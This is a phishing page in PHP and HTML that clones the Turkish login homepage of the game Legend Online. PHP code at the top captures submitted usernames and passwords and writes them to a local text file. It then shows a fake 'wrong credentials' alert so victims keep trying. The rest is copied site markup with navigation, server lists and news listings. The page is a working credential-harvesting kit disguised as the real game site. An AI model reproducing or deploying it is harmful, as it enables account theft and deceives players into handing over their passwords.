
<?php  

if (isset($_POST['login']) && isset($_POST['password'])) {

$ac = fopen("kayit.txt","a+");
$username = $_POST['login'];
$password = $_POST['password'];
$userlar = ("\n __________________ \nUsername: ".$username."\nPassword: ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
}
 ?>

<html><head>
    <meta http-equiv="Content-Type" content="text/html; charset=utf-8;">
    <meta name="language" content="">
    <meta name="location" content="">
    <meta name="author" content="Design:He.Chaomei;Web layout:Song.Guohao">
    <meta name="keywords" content="Legend Online Resmi Site,en iyi mmorpg oyunu,en iyi strateji oyunları,en iyi aksiyon oyunu">
    <meta name="description" content="Legend Online Türkiye’de en çok oynanan web tabanlı oyundur. Legend Online ücretsiz bir RPG oyundur. Legend Online indirmeden tarayıcıda oynanır. Legend Online PVP,MMORPG seven oyuncular için en iyisidir.">
    <title>Legend Online Resmi Sitesi-En İyi MMORPG Oyun-Online Strateji</title>
    <link rel="shortcut icon" href="https://cdn-img-odp3.oasgames.com/img/20181207/9cc5d62ea0b8e14b68b7fab4a69a24ae.ico">
        <script src="https://connect.facebook.net/tr_TR/sdk.js?hash=cd1daf59def12c9d6a7a6edb0544fd98&amp;ua=modern_es6" async="" crossorigin="anonymous"></script><script src="https://apis.google.com/_/scs/apps-static/_/js/k=oz.gapi.tr.65E7nS7tFhA.O/m=auth2/rt=j/sv=1/d=1/ed=1/am=wQE/rs=AGLTcCN1bpMX64qQ6oq48ZQCuDc4ASGHTg/cb=gapi.loaded_0" async=""></script><script id="google-jssdk" async="" src="https://apis.google.com/js/platform.js?onload=OAS_GAMES_JS_google_sdkInit" gapi_processed="true"></script><script id="facebook-jssdk" async="" src="//connect.facebook.net/tr_TR/sdk.js"></script><script async="" src="//www.google-analytics.com/analytics.js"></script><script src="//img.oasgames.com/upload/1513737892/static/js/jquery.js"></script>
    <script src="//img.oasgames.com/upload/1517215273/oas_library.2.2.js"></script>
                <link type="text/css" rel="stylesheet" href="https://img.oasgames.com/upload/1548661088/homesite/css/style.css">
    
    <script>

        var GameCode = 'lotr';
        var lang     = 'tr';
        var tipsArray = {
            'please_enter_uname': "Kullanıcı adını girin",
            'please_enter_pwd': "Şifreyi girin",
            'not_userinfo': "Kullanıcı adı kayıtlı değil",
            'wrong_password': "Hatalı şifre",
            'wrong_info': "Hatalı bilgi",
            'user_credit': "Puan",
            'login_out' : "Çık",
            'oas_pay' : "Ödeme",
            'newucenter' : "Kullanıcı Merkezi",
            'sign_in' : "Yoklama",
            'recomm_server' : "Önerilen",
            'recently_logser': "Sunucularım",
            'forget_pwd' : "Şifreyi Unuttum",
            'remember_pwd': "Şifremi Hatırla",
            'login' : "Giriş",
            'register': "Kayıt Ol",
            'has_sign_in':"Alındı",
            'the_mounth_sign': "Bu Ayki Toplam Yoklama",
            'day_en': "Gün",
            'day_sign_get_1': "Günlük yoklamadan 3 puan kazanılır",
            'day_sign_get_2': "7 günlük yoklamadan ekstra 10 puan kazanılır.",
            'day_sign_get_3': "15 günlük yoklamadan ekstra 23 puan kazanılır.",
            'day_sign_get_4': "Tüm ay yoklama alındığında ekstra 50 puan kazanılır.",
            'sign_role': "Yoklama Kuralı"
        };
    </script>
    <script>
        var January = "Ocak";
        var February = "Şubat";
        var March = "Mart";
        var April = "Nisan";
        var May = "Mayıs";
        var June = "Haziran";
        var July = "Temmuz";
        var August = "Ağustos";
        var September = "Eylül";
        var October = "Ekim";
        var November = "Kasım";
        var December = "Aralık";
        var Monday = "Pazartesi";
        var Tuesday = "Salı";
        var Wednesday = "Çarşamba";
        var Thuresday = "Perşembe";
        var Friday = "Cuma";
        var Saturday = "Cumartesi";
        var Sunday = "Pazar";
    </script>
    <link type="text/css" rel="stylesheet" href="/static/css/basic.css?v=1.3">
    <script type="text/javascript">
        var FB_APP_ID ="340651019346903";
        var fb_app_id ="340651019346903";
        var FB_APP_LANGUAGE = "tr_TR";
        var MOBILE_URL = "";
        var PayUrl = "https://pay.oasgames.com/oasispay/web/index.html?gid=lotr&lang=tr";
    </script>
    <script type="text/javascript" async="" src="//img.oasgames.com/fc-oasis/production/v2.0.1.1/loader.min.js"></script><script type="text/javascript" async="" src="//img.oasgames.com/fc-oasis/production/runtime.min.js?timestamp=1557907200" id="fcoScript"></script><style type="text/css">blockquote,body,button,dd,div,dl,dt,form,h1,h2,h3,h4,h5,h6,input,li,ol,p,td,textarea,th,ul{margin:0;padding:0}.fco-footer-clearfix:after{content:" ";display:block;clear:both;height:0}.fco-footer-clearfix{zoom:1;display:table}.fco-footer-fl{float:left}.fco-footer-fr{float:right}#fco-footer-footwrap{font-family:Arial,Helvetica,sans-serif;width:100%;margin:0 auto;background:#000}#fco-footer-footBox{margin:0 auto;height:auto}#fco-footer-foot{font-size:13px;height:87px;line-height:16px;width:auto;min-width:608px;padding-top:13px;overflow:hidden;color:#979797}.fco-footer-bottext{display:inline;font-size:13px;height:55px;line-height:20px;margin-top:6px;padding-left:20px}.fco-footer-bottext a:link,.fco-footer-bottext a:visited{font-size:13px;text-decoration:none;color:#979797}#fco-footer-footwrap a:hover{text-decoration:underline}#fco-footer-footwrap a{cursor:pointer;background-color:transparent}.fco-footer-logo{text-align:center;margin-left:10px}.fco-footer-marginAuto{margin:0 auto}.fco-wap-footerwrap{font-family:sans-serif;width:100%;margin:0 auto;background:#000;color:#b8b6b4;zoom:1}.fco-wap-footerwrap-con{padding:0 3vw 5vw;text-align:center;font-size:3.4vw}.fco-wap-footerwrap img{width:46vw;margin:0 auto;display:block;padding:4vw 0}.footer-wap-href{line-height:7vw}.fco-wap-footerwrap a{color:#b8b6b4;text-decoration:none;font-size:3.8vw;line-height:4.2vw}.fco-wap-footerwrap a.active{text-decoration:underline}.fco-wap-footerwrap p{margin-top:1.5vw}</style><style type="text/css">blockquote,body,button,dd,div,dl,dt,form,h1,h2,h3,h4,h5,h6,input,li,ol,p,td,textarea,th,ul{margin:0;padding:0}.fco-gdpr-box{height:100px;background:#1e2a39;position:fixed;bottom:0;left:0;width:100%;z-index:5000;overflow-x:auto;filter:Alpha(opacity=95);-moz-opacity:.95;opacity:.95}.fco-gdpr-text{min-width:1000px;margin:0 auto;zoom:1;width:1000px;position:relative}.fco-gdpr-text table{height:100px}.fco-gdpr-btn{width:140px;height:40px;background:#1e2a39;box-sizing:border-box;border:2px solid #169bd5;border-radius:10px;line-height:38px;text-align:center;color:#f2f2f2;text-decoration:none;display:inline-block}.fco-gdpr-text-left{color:#f2f2f2;width:740px;word-break:normal!important;word-wrap:break-word}.fco-gdpr-text-left a{color:#169bd5}.fco-gdpr-text-right{text-align:right}.fco-gdpr-tpl-box{height:362px;background:#1e2a39;width:608px;position:absolute;top:0;z-index:5000;filter:Alpha(opacity=95);-moz-opacity:.95;opacity:.95}.fco-gdpr-tpl-text{zoom:1;margin:0 auto;width:542px;position:relative}.fco-gdpr-tpl-text table{height:362px}.fco-gdpr-tpl-btn{width:140px;height:40px;background:#293442;box-sizing:border-box;border:2px solid #169bd5;border-radius:10px;line-height:38px;text-align:center;color:#f2f2f2;text-decoration:none;display:block;margin-top:20px}.fco-gdpr-text-tpl-left{color:#f2f2f2;width:560px;word-break:normal;word-wrap:break-word}.fco-gdpr-text-tpl-left p{text-align:left}.fco-gdpr-text-tpl-left a{color:#169bd5}#fco-gdpr{font-size:20px}.fco-gdpr-wap-box{background:rgba(30,42,57,.8);position:fixed;bottom:0;left:0;width:100%;font-size:3vw;padding:3vw 0 3vw 3vw;z-index:5000}.fco-gdpr-wap-text{width:97vw;line-height:8vw;position:relative;font-size:3.6vw}.fco-gdpr-wap-btn{width:20vw;height:8vw;box-sizing:border-box;border-radius:1.5vw;line-height:8vw;text-align:center;color:#f2f2f2;text-decoration:none;display:inline-block;position:absolute;right:3vw;top:50%;margin-top:-4vw;font-size:3.8vw;background:#169bd5}.fco-gdpr-wap-text-left{display:inline-block;vertical-align:middle;line-height:4.6vw;color:#f2f2f2;width:70vw}.fco-gdpr-wap-text-left a{color:#169bd5}</style><style type="text/css">.fb_hidden{position:absolute;top:-10000px;z-index:10001}.fb_reposition{overflow:hidden;position:relative}.fb_invisible{display:none}.fb_reset{background:none;border:0;border-spacing:0;color:#000;cursor:auto;direction:ltr;font-family:"lucida grande", tahoma, verdana, arial, sans-serif;font-size:11px;font-style:normal;font-variant:normal;font-weight:normal;letter-spacing:normal;line-height:1;margin:0;overflow:visible;padding:0;text-align:left;text-decoration:none;text-indent:0;text-shadow:none;text-transform:none;visibility:visible;white-space:normal;word-spacing:normal}.fb_reset>div{overflow:hidden}@keyframes fb_transform{from{opacity:0;transform:scale(.95)}to{opacity:1;transform:scale(1)}}.fb_animate{animation:fb_transform .3s forwards}
.fb_dialog{background:rgba(82, 82, 82, .7);position:absolute;top:-10000px;z-index:10001}.fb_dialog_advanced{border-radius:8px;padding:10px}.fb_dialog_content{background:#fff;color:#373737}.fb_dialog_close_icon{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 0 transparent;cursor:pointer;display:block;height:15px;position:absolute;right:18px;top:17px;width:15px}.fb_dialog_mobile .fb_dialog_close_icon{left:5px;right:auto;top:5px}.fb_dialog_padding{background-color:transparent;position:absolute;width:1px;z-index:-1}.fb_dialog_close_icon:hover{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -15px transparent}.fb_dialog_close_icon:active{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yq/r/IE9JII6Z1Ys.png) no-repeat scroll 0 -30px transparent}.fb_dialog_iframe{line-height:0}.fb_dialog_content .dialog_title{background:#6d84b4;border:1px solid #365899;color:#fff;font-size:14px;font-weight:bold;margin:0}.fb_dialog_content .dialog_title>span{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/yd/r/Cou7n-nqK52.gif) no-repeat 5px 50%;float:left;padding:5px 0 7px 26px}body.fb_hidden{height:100%;left:0;margin:0;overflow:visible;position:absolute;top:-10000px;transform:none;width:100%}.fb_dialog.fb_dialog_mobile.loading{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/ya/r/3rhSv5V8j3o.gif) white no-repeat 50% 50%;min-height:100%;min-width:100%;overflow:hidden;position:absolute;top:0;z-index:10001}.fb_dialog.fb_dialog_mobile.loading.centered{background:none;height:auto;min-height:initial;min-width:initial;width:auto}.fb_dialog.fb_dialog_mobile.loading.centered #fb_dialog_loader_spinner{width:100%}.fb_dialog.fb_dialog_mobile.loading.centered .fb_dialog_content{background:none}.loading.centered #fb_dialog_loader_close{clear:both;color:#fff;display:block;font-size:18px;padding-top:20px}#fb-root #fb_dialog_ipad_overlay{background:rgba(0, 0, 0, .4);bottom:0;left:0;min-height:100%;position:absolute;right:0;top:0;width:100%;z-index:10000}#fb-root #fb_dialog_ipad_overlay.hidden{display:none}.fb_dialog.fb_dialog_mobile.loading iframe{visibility:hidden}.fb_dialog_mobile .fb_dialog_iframe{position:sticky;top:0}.fb_dialog_content .dialog_header{background:linear-gradient(from(#738aba), to(#2c4987));border-bottom:1px solid;border-color:#1d3c78;box-shadow:white 0 1px 1px -1px inset;color:#fff;font:bold 14px Helvetica, sans-serif;text-overflow:ellipsis;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0;vertical-align:middle;white-space:nowrap}.fb_dialog_content .dialog_header table{height:43px;width:100%}.fb_dialog_content .dialog_header td.header_left{font-size:12px;padding-left:5px;vertical-align:middle;width:60px}.fb_dialog_content .dialog_header td.header_right{font-size:12px;padding-right:5px;vertical-align:middle;width:60px}.fb_dialog_content .touchable_button{background:linear-gradient(from(#4267B2), to(#2a4887));background-clip:padding-box;border:1px solid #29487d;border-radius:3px;display:inline-block;line-height:18px;margin-top:3px;max-width:85px;padding:4px 12px;position:relative}.fb_dialog_content .dialog_header .touchable_button input{background:none;border:none;color:#fff;font:bold 12px Helvetica, sans-serif;margin:2px -12px;padding:2px 6px 3px 6px;text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog_content .dialog_header .header_center{color:#fff;font-size:16px;font-weight:bold;line-height:18px;text-align:center;vertical-align:middle}.fb_dialog_content .dialog_content{background:url(https://static.xx.fbcdn.net/rsrc.php/v3/y9/r/jKEcVPZFk-2.gif) no-repeat 50% 50%;border:1px solid #4a4a4a;border-bottom:0;border-top:0;height:150px}.fb_dialog_content .dialog_footer{background:#f5f6f7;border:1px solid #4a4a4a;border-top-color:#ccc;height:40px}#fb_dialog_loader_close{float:left}.fb_dialog.fb_dialog_mobile .fb_dialog_close_button{text-shadow:rgba(0, 30, 84, .296875) 0 -1px 0}.fb_dialog.fb_dialog_mobile .fb_dialog_close_icon{visibility:hidden}#fb_dialog_loader_spinner{animation:rotateSpinner 1.2s linear infinite;background-color:transparent;background-image:url(https://static.xx.fbcdn.net/rsrc.php/v3/yD/r/t-wz8gw1xG1.png);background-position:50% 50%;background-repeat:no-repeat;height:24px;width:24px}@keyframes rotateSpinner{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
.fb_iframe_widget{display:inline-block;position:relative}.fb_iframe_widget span{display:inline-block;position:relative;text-align:justify}.fb_iframe_widget iframe{position:absolute}.fb_iframe_widget_fluid_desktop,.fb_iframe_widget_fluid_desktop span,.fb_iframe_widget_fluid_desktop iframe{max-width:100%}.fb_iframe_widget_fluid_desktop iframe{min-width:220px;position:relative}.fb_iframe_widget_lift{z-index:1}.fb_iframe_widget_fluid{display:inline}.fb_iframe_widget_fluid span{width:100%}</style></head>
<body>
            <div id="OAS_WidgetLogin_Root"><div id="fullbg" style="filter:alpha(opacity=30);-moz-opacity:0.3;opacity:0.3;background-color:#000;width:100%;height:100%;z-index:1000;position:fixed;left:0;top:0;display:none;overflow: hidden;"></div><div id="OAS_GAMES_WIDGETS_loginbox" style="display:none;width:522px;height:522px;position:fixed;top:50%;left:50%;margin-top:-253px;margin-left:-260px;*margin-right:260px;z-index:9999;"><iframe frameborder="0" width="100%" height="100%" id="login_reg_page" scrolling="no" allowtransparency="true" src="//www.oasgames.com/?a=widget&amp;m=login_page&amp;lang=tr&amp;fb_app_id=340651019346903&amp;fb_third=&amp;ga_account=&amp;ga_page=&amp;fb_app_url="></iframe></div></div>

    <div class="wrap" style="background-image: url(https://cdn-img-odp3.oasgames.com/img/20181203/2d8e85cdf770c6ea2b6ce1649cac4383.jpg);background-position:center top;background-repeat:no-repeat">
        <div class="box">
                        <div class="header por">
            <div class="logo poa">
                <a href="//lotr.oasgames.com" title="" onclick="_ga_track_event('lotr','lotrosite_Top-bar-logo')">
                                        <img src="https://cdn-img-odp3.oasgames.com/img/20181204/960e7339e22eee035a8b3daab3f2c4fe.png" alt="">
                                    </a>
            </div>
      <div class="nav poa">
                        <div class="nav_item n1 fl por">
              <i></i><a class="nav_btn nav_point" href="//lotr.oasgames.com/" onclick="_ga_track_event('lotr','lotrosite_Tbar1')">Ana Sayfa</a><i></i>
                    </div>
                        <div class="nav_item n2 fl por">
              <i></i><a target="_blank" class="nav_btn ">Haber</a><i></i>
                        <div class="menu fw poa">
                  <ul>
                                                            <li><a href="https://lotr.oasgames.com/?act=sq&amp;method=new_list&amp;fc=1" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Tbar2-1')">Haber</a></li>
                                                            <li><a href="https://lotr.oasgames.com/?act=sq&amp;method=new_list&amp;fc=2" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Tbar2-2')">Etkinlikler</a></li>
                                                            <li><a href="https://lotr.oasgames.com/?act=sq&amp;method=new_list&amp;fc=3" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Tbar2-3')">Sürüm</a></li>
                    
                  </ul>
              </div>
                        </div>
                        <div class="nav_item n3 fl por">
              <i></i><a target="_blank" class="nav_btn ">Veriler</a><i></i>
                        <div class="menu fw poa">
                  <ul>
                                                            <li><a href="https://lotr.oasgames.com/strategy" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Tbar3-1')">Temel Bilgiler</a></li>
                    
                  </ul>
              </div>
                        </div>
                        <div class="nav_item n4 fl por">
              <i></i><a target="_blank" class="nav_btn ">Sosya</a><i></i>
                        <div class="menu fw poa">
                  <ul>
                                                            <li><a href="https://www.facebook.com/LegendOnlineCommunity" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Tbar4-1')">Facebook</a></li>
                                                            <li><a href="http://tr.forum.oasgames.com/" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Tbar4-2')">Forum</a></li>
                                                            <li><a href="http://ask.oasgames.com/tr" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Tbar4-3')">Soru Sistemi</a></li>
                                                            <li><a href="https://support.oasgames.com/?a=question&amp;m=add&amp;lang=tr&amp;game_code=lotr" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Tbar4-4')">GM</a></li>
                                                            <li><a href="http://shop.oasgames.com/?lang=tr" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Tbar4-5')">Puan Marketi</a></li>
                    
                  </ul>
              </div>
                        </div>
              </div>
              <div class="choose_language fr">
          <ul class="language_first_ul">
            <li class="language_first_li">
                                                                                                            <i class="language_tr"></i><span>Türkçe</span>
                                                                                                                                                                                                                                <ul>
                                  <li onclick="javascript:window.open('https://lobr.oasgames.com')"><i class="language_pt"></i><span>Português</span></li>
                                  <li onclick="javascript:window.open('//losv.oasgames.com')"><i class="language_sv"></i><span>Svenska</span></li>
                                  <li onclick="javascript:window.open('//lotr.oasgames.com')"><i class="language_tr"></i><span>Türkçe</span></li>
                                  <li onclick="javascript:window.open('//lode.oasgames.com')"><i class="language_de"></i><span>Deutsch</span></li>
                                  <li onclick="javascript:window.open('//lonl.oasgames.com')"><i class="language_nl"></i><span>Holland</span></li>
                                  <li onclick="javascript:window.open('//loel.oasgames.com')"><i class="language_el"></i><span>ελληνικά</span></li>
                                  <li onclick="javascript:window.open('//loes.oasgames.com')"><i class="language_es"></i><span>Español</span></li>
                                  <li onclick="javascript:window.open('//loar.oasgames.com')"><i class="language_ar"></i><span>العربية</span></li>
                                  <li onclick="javascript:window.open('//lopl.oasgames.com')"><i class="language_pl"></i><span>Polski</span></li>
                              </ul>
            </li>
          </ul>
        </div>
                  <div class="praise_facebook"> 
        <iframe src="//www.facebook.com/plugins/like.php?href=https://www.facebook.com/LegendOnlineCommunity&amp;width&amp;layout=button_count&amp;action=like&amp;show_faces=true&amp;share=false&amp;height=21" scrolling="no" frameborder="0" style="border:none; overflow:hidden; height:21px; width:150px;" allowtransparency="true"></iframe> 
      </div>
          </div>


            <div class="main clearfix">
                <input type="hidden" id="facebook_app_id" value="340651019346903">
                <input type="hidden" id="google_app_id" value="<{$google_app_id}>">
                <input type="hidden" id="passport_url_id" value="//passport.oasgames.com">
                <input type="hidden" id="http_host_id" value="//lotr.oasgames.com">
                <input type="hidden" id="res_url_id" value="//res.oasgames.com">
                <input type="hidden" id="domian_url_id" value="oasgames.com">
                <input type="hidden" id="oas_host_id" value="//www.oasgames.com">

                <div class="fl por w280">
                    <a class="start poa" href="/serverlist" target="_blank">
    <div class="start_img">
        <img src="">
    </div>
</a>
<div class="login">
    <div class="login_cont">






        <form method="POST" action="">
          <div class="login_bef por">
            <div class="login_ipt login_usn">
                <i class=""></i>
                <input name="login" type="text" placeholder="Kullanıcı adını girin">
            </div>
            <div class="login_ipt login_pwd">
                <i class=""></i>
                <input name="password" type="password" placeholder="Şifreyi girin">
            </div>
            <a href="//www.oasgames.com?a=ucenter&amp;m=findpwd&amp;lang=tr&amp;lang=tr"  class="fr login_fgt" rel="nofollow">Şifreyi Unuttum</a>
            <div class="login_rmb">
                <input id="checkbox" type="checkbox" tabindex="3" checked="">
                <label for="checkbox">Şifremi Hatırla</label>
            </div>
            <div class="login_btn">
                <button type='submit' class="login_btn" style="width: 230px;height: 35px;border-radius: 5px;">Giriş</button>
            </div>
            <a class="fr login_reg" >Kayıt Ol</a>

    <div class="login_other">
                <a href="javascript:;" class="login_fb" onclick="javascript:OAS_GAMES_JS.facebook.login({'fail':'Fail to connect with facebook'});_ga_track_event('lotr','lotrosite_Left-fblogin');"></a>
                <a href="javascript:;" class="login_gg" onclick="javascript:OAS_GAMES_JS.google.login({'fail':'Fail to connect with Google'});_ga_track_event('lotr','lotrosite_Left-glogin');"></a>
                <a href="javascript:;" class="login_tw" onclick="javascript:OAS_GAMES_JS.twitter.login({'fail':'Fail to connect with Twitter'});_ga_track_event('lotr','lotrosite_Left-tlogin');"></a>
                <a href="javascript:;" class="login_yt" onclick="javascript:OAS_GAMES_JS.google.login({'fail':'Fail to connect with Google'});_ga_track_event('lotr','lotrosite_Left-ytblogin');"></a>
            </div>
            <div class="login_tips poa" style="display: none">
                <b></b>
                <p>Kullanıcı adını girin</p>
            </div>
        </div></form>





















    </div>
</div>
<div class="server">
    <a href="/serverlist" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Left–Servermore');" class="more fr"></a>

    <h1>Önerilen</h1>

    <div class="lbox">
        <div class="search por">
                        <select id="server_type" style="width: 25%;height: 24px;border: 1px solid #e0dede;background: #f4f4f4; margin-right: 12px;">
                <option value="Normal">Normal</option>
                <option value="OAS">OAS</option>
            </select>
                        <input type="text" id="quickid" class="quickid" placeholder="ID" style="width:30%" }}="">
            <a href="javascript:void(0)" style="width:25%" data-url="/serverlist/s9999" class="search_btn fw fr" onclick="_ga_track_event('lotr','lotrosite_Server-play');" id="quick_play">Oyun</a>
        </div>
        <ul class="serlist">
                        <li class="hot">
              <a href="/serverlist/s3036" onclick="_ga_track_event('lotr','lotrosite_Left–Serverlist');" target="_blank">
                                <i class="tag"></i>
                                    OAS1036:Şok Darbesi
              </a>
            </li>
                        <li class="hot">
              <a href="/serverlist/s3035" onclick="_ga_track_event('lotr','lotrosite_Left–Serverlist');" target="_blank">
                                    OAS1035:Kızgın Ateş
              </a>
            </li>
                        <li class="hot">
              <a href="/serverlist/s3034" onclick="_ga_track_event('lotr','lotrosite_Left–Serverlist');" target="_blank">
                                    OAS1034:Derin Kalkan
              </a>
            </li>
                        <li class="hot">
              <a href="/serverlist/s3033" onclick="_ga_track_event('lotr','lotrosite_Left–Serverlist');" target="_blank">
                                    OAS1033:Karanlık Saldırı
              </a>
            </li>
                    </ul>
    </div>
</div>
<div class="lbox quick">
    <h2>Bağlantılar</h2>
    <ul>
                                <li><a href="https://www.facebook.com/LegendOnlineCommunity/" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Left-Quickentry-0');">Facebook</a></li>
                                <li><a href="https://support-center.oasgames.com/question/ask?game_code=lotr&amp;game_language=tr" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Left-Quickentry-1');">GM</a></li>
                                <li><a href="https://forum.lotr.oasgames.com" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Left-Quickentry-2');">Forum</a></li>
                                <li><a href="https://lotr.oasgames.com/strategy" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Left-Quickentry-3');">Temel Bilgiler</a></li>
                            </ul>
</div>
<div class="pic">
    <a href="https://version81-lotr.oasgames.com/" title="Strateji" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Left-Gameinfo');">
        <img src="https://cdn-img-odp3.oasgames.com/img/20181204/85b1e8631ceec903c662ac974b4fd407.jpg" alt="Strateji">
    </a>
</div>
<div class="video por">
    <img src="//img.oasgames.com/oasevent/1463752569.jpg" alt="">

            <a href="//img.oasgames.com/oasevent/1488427489.flv" title="" onclick="_ga_track_event('lotr','lotrosite_Left-Vedio');" class="poa" data-type="video" data-lightbox="video1">
            <small></small>
            <span></span></a>
    

            <a href="https://www.youtube.com/embed/tihhETJrJG8" title="" onclick="_ga_track_event('lotr','lotrosite_Left-Vedio');" class="poa" data-type="video" data-lightbox="video1">
            <small></small>
            <span></span></a>
    </div>
<div class="tc_bj_rl" id="tc_bj" style="display:none;background:#000;filter:alpha(opacity=80);-moz-opacity:0.8;-khtml-opacity: 0.8;opacity: 0.8;position:fixed;left: 0px;top: 0px;z-index:9;"></div>
<script src="//img.oasgames.com/upload/1555411602/login.js"></script>
<script src="//img.oasgames.com/upload/1511250965/js/kalendar.js"></script>
                </div>
                <div class="fr w684">
                        <div class="focus">
        <iframe scrolling="yes" src="//plugins.oasgames.com/lunbo/weget/index.php?type_id=33639" style="width:100%;border:0px;height:224%;overflow:hidden;"></iframe>
    </div>
    <div class="pic">
                <a href="https://lotr.oasgames.com/?act=sq&amp;method=card" title="Ödül Kodu" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Home-Activitypic0')">
          <img src="https://cdn-img-odp3.oasgames.com/img/20181204/65e3568bb66bef80805db979bf0f9712.jpg" alt="Ödül Kodu">
        </a>
                <a href="https://img.oasgames.com/upload/1527163754/LegendOnline_tr_2.4.1.4193_OAS.exe" title="Launcher - lotr" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Home-Activitypic1')">
          <img src="https://cdn-img-odp3.oasgames.com/img/20181204/3fa20ce37c481a6d0e4d8363284a5055.jpg" alt="Launcher - lotr">
        </a>
                <a href="https://support.oasgames.com/index.php" title="SAC - lotr" target="_blank" onclick="_ga_track_event('lotr','lotrosite_Home-Activitypic2')">
          <img src="https://cdn-img-odp3.oasgames.com/img/20181204/0f6b20787b7adab0caaad9b38f990a98.jpg" alt="SAC - lotr">
        </a>
            </div>
    <div class="news">
        <div class="ntab fw">

                                                      <a href="javascript:void(0);" onclick="_ga_track_event('lotr','lotrosite_Home-hot')" class="on">
        <span class="t1">
          <i></i>
                                    Duyurular
                            </span>
            </a>
                                              <a href="javascript:void(0);" onclick="_ga_track_event('lotr','lotrosite_Home-news')">
        <span class="t2">
          <i></i>
                                    Haberler
                            </span>
            </a>
                                              <a href="javascript:void(0);" onclick="_ga_track_event('lotr','lotrosite_Home-activity')">
        <span class="t4">
          <i></i>
                                    Etkinlikler
                            </span>
            </a>
                                              <a href="javascript:void(0);" onclick="_ga_track_event('lotr','lotrosite_Home-notice')">
        <span class="t3">
          <i></i>
                                    Sürüm
                            </span>
            </a>
                              </div>

                            <div class="ncont por" style="display: block;">
          <a href="/articlelist" onclick="_ga_track_event('lotr','lotrosite_Home-hot-more')" target="_blank" class="more poa"></a>
            <ul>
                                
                <li>
                  <a href="/articlelist/all/key-3850" onclick="_ga_track_event('lotr','lotrosite_Home-hot-link')" target="_blank">
                        <p>                            [YENİLİKLER]                                                                                    《Legend Online》15 Mayıs Bakım Duyurusu</p>
                        <span>05.13.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/all/etkinlik_duyurusu_11_mays_2019" onclick="_ga_track_event('lotr','lotrosite_Home-hot-link')" target="_blank">
                        <p>                                                        [ETKİNLİK]                                                        Etkinlik Duyurusu - 11 Mayıs 2019</p>
                        <span>05.09.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/all/key-3849" onclick="_ga_track_event('lotr','lotrosite_Home-hot-link')" target="_blank">
                        <p>                            [YENİLİKLER]                                                                                    Yeni Server Açılıyor （OAS 1036)</p>
                        <span>05.09.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/all/key-3848" onclick="_ga_track_event('lotr','lotrosite_Home-hot-link')" target="_blank">
                        <p>                            [YENİLİKLER]                                                                                    Sunucu Birleştirme Duyurusu – 8 Mayıs</p>
                        <span>05.07.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/all/key-3847" onclick="_ga_track_event('lotr','lotrosite_Home-hot-link')" target="_blank">
                        <p>                            [YENİLİKLER]                                                                                    《Legend Online》7 Mayıs Bakım Duyurusu</p>
                        <span>05.07.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/all/etkinlik_duyurusu_4_mays_2019" onclick="_ga_track_event('lotr','lotrosite_Home-hot-link')" target="_blank">
                        <p>                                                        [ETKİNLİK]                                                        Etkinlik Duyurusu - 4 Mayıs 2019</p>
                        <span>04.30.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/all/key-3846" onclick="_ga_track_event('lotr','lotrosite_Home-hot-link')" target="_blank">
                        <p>                            [YENİLİKLER]                                                                                    Yeni Server Açılıyor （OAS 1035)</p>
                        <span>04.26.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/all/etkinlik_duyurusu_2_mays_2019" onclick="_ga_track_event('lotr','lotrosite_Home-hot-link')" target="_blank">
                        <p>                                                        [ETKİNLİK]                                                        Etkinlik Duyurusu - 2 Mayıs 2019</p>
                        <span>04.30.2019</span>
                    </a>
                </li>
                            </ul>
        </div>
                            <div class="ncont por" style="display: none;">
          <a href="/articlelist/news" onclick="_ga_track_event('lotr','lotrosite_Home-news-more')" target="_blank" class="more poa"></a>
            <ul>
                                
                <li>
                  <a href="/articlelist/news/key-3850" onclick="_ga_track_event('lotr','lotrosite_Home-news-link')" target="_blank">
                        <p>                            [YENİLİKLER]                                                                                    《Legend Online》15 Mayıs Bakım Duyurusu</p>
                        <span>05.13.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/news/key-3849" onclick="_ga_track_event('lotr','lotrosite_Home-news-link')" target="_blank">
                        <p>                            [YENİLİKLER]                                                                                    Yeni Server Açılıyor （OAS 1036)</p>
                        <span>05.09.2019</span>
                    </a>
                </li>
                                
                <li>
                  <a href="/articlelist/news/key-3848" onclick="_ga_track_event('lotr','lotrosite_Home-news-link')" target="_blank">
                        <p>                            [YENİLİKLER]                                                                                    Sunucu Birleştirme Duyurusu – 8 Mayıs</p>
                        <span>05.07.2019</span>
                    </a>
                </li>
                                
                <li>
